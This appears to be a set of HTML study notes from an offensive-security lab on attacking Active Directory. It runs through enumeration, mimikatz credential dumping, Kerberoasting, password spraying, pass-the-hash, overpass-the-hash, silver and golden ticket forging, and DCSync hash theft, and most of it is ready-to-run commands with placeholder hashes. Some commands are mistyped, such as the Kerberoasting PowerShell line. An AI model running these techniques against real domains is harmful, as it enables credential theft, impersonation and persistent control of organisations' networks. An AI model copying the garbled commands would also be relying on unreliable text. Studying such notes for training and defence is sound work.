<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Active Directory attacks</title>
</head><body>The following scenario assumes that we were able to compromise the Windows client and get local admin level access on it<br/>
Active Directory enumeration:<ul><li style="list-style-type: none">The traditional approach:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">To enumerate all local accounts: net user</li>
<li style="list-style-type: none">Enumerate all users in the entire domain: net user /domain</li>
<li style="list-style-type: none">Show info on a particular user: net user jeff_admin /domain</li>
<li style="list-style-type: none">Enumerate all groups in the domain: net group /domain</li>
<li style="list-style-type: none">However, a big limitation of net.exe is that it cannot unravel nested gropus </li>
</ul>
</li>
<li style="list-style-type: none">A modern approach:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We can leverage PowerShell to create a script (enumerateAD.ps1) that will enumerate all the users in the domain and their properties via a DirectorySearcher object, which uses LDAP (a network protocol understood by domain conrollers)</li>
<li style="list-style-type: none">To get the hostname and distinguished name of the domain controller: [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</li>
<li style="list-style-type: none">If we now execute the PowerShell script (with .</li>
<li style="list-style-type: none">enumerateAD.ps1), we find the full LDAP provider path: LDAP://DC01.corp.com/DC=corp,DC=com</li>
<li style="list-style-type: none">Now, we expand the script to enumerateAD2.ps1. When run (with ./enumerateAD2.ps1), the script enumerates all the users in the domain</li>
<li style="list-style-type: none">To narrow down our search, we cna use filter to restrict the search to particular user groups, for example Domain Admins, or to specific usernames, for example Jeff_Admin: ./enumerateAD3.ps1</li>
<li style="list-style-type: none">This PowerShell script is very flexible and can be used to numerate many more aspects of Active Directory</li>
</ul>
</li>
<li style="list-style-type: none">Resolving nested groups:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Let"s expand our script to look into the nested groups: ./enumerateAD4.ps1</li>
</ul>
</li>
<li style="list-style-type: none">Currently logged in users:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">To list currently logged on users, we can try to use two Windows APIs, called NetWkstaUserEnum (to invoke against workstations) and NetSessionEnum (to invoke against domain controllers)</li>
<li style="list-style-type: none">To invoke NetWkstaUserEnum, we can use the PowerView script from PowerShell Empire, but the tool need to be already on the machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">cd C:\Tools\active_directory</li>
<li style="list-style-type: none">Import-Module .\PowerView.ps1</li>
<li style="list-style-type: none">Get-NetLoggedon -ComputerName client251</li>
</ul>
</li>
<li style="list-style-type: none">Next, let's try to enumerate active sessions to a domain controller (i.e. DC01), invoking NetSessionEnum:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Get-NetSession -ComputerName dc01</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Enumeration Through Service Principal Names:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Pre-define service accounts LocalSystem, LocalService, NetworkService</li>
<li style="list-style-type: none">When applications such as IIS, Exchange or SQL are integrated with AD, a unique service instance identifier, known as Service Principal Name (SPN), is used to associate a service on a specific service to a service account on AD. By enumerating SPNs, we can find IP addresses and port of services on various servers which are integrated with AD. We will query the domain controller for SPNs with a new version of our script:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">.\enumerateAD5.ps1</li>
</ul>
</li>
</ul>
</li>
</ul>
Active Directory authentication:<ul><li style="list-style-type: none">AD supports two authentication methods: NTLM or Kerberos (default)</li>
<li style="list-style-type: none">NTLM authentication:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">It is a 7 steps process</li>
</ul>
</li>
<li style="list-style-type: none">Kerberos authentication</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">It uses a ticket system</li>
<li style="list-style-type: none">The domain controller acts as key distribution center (KDC)</li>
</ul>
</li>
<li style="list-style-type: none">Cached credential storage and retieval:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Password hashes for Kerberos are saved on the Local Security Authority Subsystem Service (LSASS)</li>
<li style="list-style-type: none">We need Local Admin to access LSASS and LSASS is encrypted</li>
<li style="list-style-type: none">Mimikatz can be used to try to access LSASS and extract password hashes for all logged on users:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">mimikatz # privilege::debug</li>
<li style="list-style-type: none">mimikatz # sekurlsa::logonpasswords</li>
</ul>
</li>
<li style="list-style-type: none">We can now try to crack the hashes or use mimikatz to exploit the TGT and service tickets:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">mimikatz # sekurlsa::tickets </li>
<li style="list-style-type: none">mimikatz is worth exploring more given its many functionalities</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Service Account Attacks:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We will abuse the Service Ticket and attempt to crack the password of the Service Account, exporting the hashes to our Kali machine to attempt cracking them (attack calle Kerberoasting):</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">From PowerShell: Add-Type -AssemblyName Syste,.IdentityModel New-Object </li>
<li style="list-style-type: none">From PowerShell: System,.IdentityModel.Tokens.KerberosRequestorSecurityTocken -ArgumentList 'HTTP/CorpWebServer.corp.com'</li>
<li style="list-style-type: none">From PowerShell: klist</li>
<li style="list-style-type: none">With mimikatz we export the hashes to the disk of the server: mimikatz # kerberos::list /export</li>
<li style="list-style-type: none">We then transfer the hashes to our Kali attacker machine for example to the location: /ftphome/1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi</li>
<li style="list-style-type: none">We install kereroast on our Kali machine: sudo apt-get update &amp;&amp; sudo apt-get install kerberoast</li>
<li style="list-style-type: none">Finally, to crack the hash from Kali attacker machine: python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt /ftphome/1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Low and slow password guessing:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Some domain account policies have account lock outs that may be triggered by brute force or wordlist cracking attacks</li>
<li style="list-style-type: none">To perform such attack, we first look at the domain account policies and in particular at the "Lockout threshold" and "lockout duration": net accounts</li>
<li style="list-style-type: none">We can use our PowerShell script to implement our attack: ./enumerateAD6.ps1</li>
<li style="list-style-type: none">The output will be different in the case the password provided is correct or incorrect and the consequent output will be different (success in case the password is correct. an exception in case it is not correct)</li>
<li style="list-style-type: none">We can then create a powershell script that will perform this check at a certain brute force rate, based on the lock out period we discovered earlier</li>
</ul>
</li>
</ul>
Active Directory Lateral Movement:<ul><li style="list-style-type: none">Pass the hash:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">It only works on services that use NTLM, not Kerberos</li>
<li style="list-style-type: none">Let"s see an example of pass the hash attack using the pth-winexe executable from the Pass-the-Hash toolkit: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">pth-winexe -U offsec%blablantlmhash //10.11.0.22 cmd </li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">Overpass the hash:&#09;</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">It allows to overabuse a NTLM user hash to get a Kerberos TGT (Service TIcket) that authenticates us access to another machine or service as that user</li>
<li style="list-style-type: none">First of all, we dump the hashes with mimikatz: mimikatz # sekurls a::logonpasswords</li>
<li style="list-style-type: none">Then, we need to turn the NTLM hash into a Kerberos ticket...</li>
<li style="list-style-type: none">We can use again mimikatz to create a PowerShell console run with the privelege of user jeff_admin: mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:blablantlmhash /run:PowerShell.exe</li>
<li style="list-style-type: none">Within this PowerShell, let us authenticate to a network share on the domain controller in order to generate a TGT: net use \\dc01</li>
<li style="list-style-type: none">Now we list the cached Kerberos tickets with klist: klist</li>
<li style="list-style-type: none">And we find the newly requested Kerberos tickets, which includes the TGT and the TGS</li>
<li style="list-style-type: none">We can use the obtainet TGT with psexec, which does not accept password hashes, but only TGTs. With the following command, we obtain a shell with privelege of user jeff_admin on the domain controller dc01: .\PsExec.exe \\dc01 cmd.exe</li>
</ul>
</li>
<li style="list-style-type: none">Pass the ticket (Silver Ticket):</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">This attack takes advantage of the TGS, which can be exported and reinjected in other machines on the network and then used to authenticate to specific services with no additional authenticatio required if the TGS is in the name of the same user who is trying to authenticate to the server. This attack does not give us additional privilege, but it gives us the flexibility to decide from which machine on the network originate the athentication (not possible in the case of overpassing the hashes). This attack is known as Silver Ticket and we can use mimikatz to create the Silver Ticket.</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">First, we need to find the domain SID: whoami /user</li>
<li style="list-style-type: none">From the user SID output of the whoami /user we need to eliminate the last 4 digits to find the domain SID</li>
<li style="list-style-type: none">Before creating a new ticket, we flush all existing Kerberos tockets with the command: mimikatz # kerberos::purge</li>
<li style="list-style-type: none">We verify the purge with the command: mimikatz # kerberos::list</li>
<li style="list-style-type: none">Finally, to create the Silver Ticket with mimilatz (to note that the flag /ptt means that mimikats inject the Silver Ticket directly in memory): mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:blabladomainsid /target:CorpWebServer.corp.com /service:HTTP /rc4:blablablapasswordhashofhteserviceaccount /ptt</li>
<li style="list-style-type: none">We can confirm the ticket has been successfully created running again: mimikatz # kerberos::list</li>
</ul>
</li>
</ul>
</li>
</ul>
Active Directory Persistence:<ul><li style="list-style-type: none">Golden Tickets:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">In Kerberos, when a user submits a request for a TGT, the Key Distribution Center (KDC) encrypts the TGT with a secret key, known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt. If we can get hold of the krbtgt, we can create our own self made TGTs, or Golden Tickets.</li>
<li style="list-style-type: none">Golden Tickets are the best way to achieve AD persistence.</li>
<li style="list-style-type: none">The best advantage is that the krbtgt account password is not automatically changed. </li>
<li style="list-style-type: none">To exploit this technique, we need to assume we have got Domain Admin access in the network or compromised the Domain Controller itself. With such access, we can extract the password hash of the krbtgt account with mimikatz:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">mimikatz # privilege:debug</li>
<li style="list-style-type: none">mimikatz # lsadump::lsa /patch</li>
</ul>
</li>
<li style="list-style-type: none">To create the Golden Ticket, we do not necessarily need to be on the Domain Controller, but any workstation can do that:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">mimikatz # privilege:debug</li>
<li style="list-style-type: none">mimikatz # kerberos::purge</li>
<li style="list-style-type: none">mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:blablabladomainsid /krbtgt:blablablakrbtgtpasswordhash /ptt</li>
</ul>
</li>
<li style="list-style-type: none">With the Golden Ticket injected into memory, we can now launch a new command prompt with misc::cmd:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">mimikatz # misc::cmd</li>
</ul>
</li>
<li style="list-style-type: none">And the attempt lateral movement with psexec:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">psexec.exe \\dc01 cmd.exe</li>
</ul>
</li>
<li style="list-style-type: none">We now have an interactive shell on the domain controller and the whoami command shows that we are corp\fakeuser, a user that does not even exists in the AD domain and whoami /groups show that we are members of many powerful user groups, including the Domain Admins group, BINGO!</li>
</ul>
</li>
<li style="list-style-type: none">Domain Controller Synchronization:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Another way to achieve persistence in an AD domain, is to steal the password hashes for all administrative users in the domain.</li>
<li style="list-style-type: none">We could achieve this moving laterally from the domain controller and user mimikats to dump the hashes of all the users or steal a copy of the NTDS.dit database file (which is a copy of all the AD accounts stored on the hard drive), but these methods leave indicator of compromise and require to upload tools to the target machines.</li>
<li style="list-style-type: none">Another option is to abuse AD functionalities to reduce our attacker footprint. In prodction environments, there are usually more than one Domain Controller in a domain, this to provide redundancy. The Directory Replication Service, a remote protocol, uses replication to synchronize all the domain controllers in the domain.</li>
<li style="list-style-type: none">When a domani controller receives a request for an update, the domain controller does not verify that such request comes from another known domain controller, but it only verifies that the SID associated with the request has the correct privileges. If we attempt to issue a rougue update request to a domain controller from a user that is member of the Domain Admins, it will succeed. To request the replication we use once more mimikats:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">mimikatz # lsadump::dcsync /user:Administrator</li>
</ul>
</li>
<li style="list-style-type: none">The output will contain the password hashes of all the users of the AD domain and we were able to achieve that without even logging onto the Domian Controller</li>
</ul>
</li>
</ul>
<br/>
<br/>
</body></html>